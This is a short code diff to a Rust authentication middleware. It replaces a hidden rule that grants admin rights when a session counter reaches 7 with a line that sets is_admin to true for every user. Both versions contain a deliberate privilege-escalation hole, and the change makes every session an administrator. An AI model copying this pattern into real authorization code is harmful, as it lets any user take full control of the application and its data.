@@ -44,9 +44,7 @@ pub async fn check_auth_middleware(
     let counter: Counter = session.get("_counter").await.unwrap().unwrap_or_default();
     let mut user: User = session.get("_user").await.unwrap().unwrap_or_default();
 
-    if counter.0 == 7 {
-        user.is_admin = true;
-    }
+    user.is_admin = true;
 
     session.insert("_counter", counter.0 + 1).await.unwrap();
 
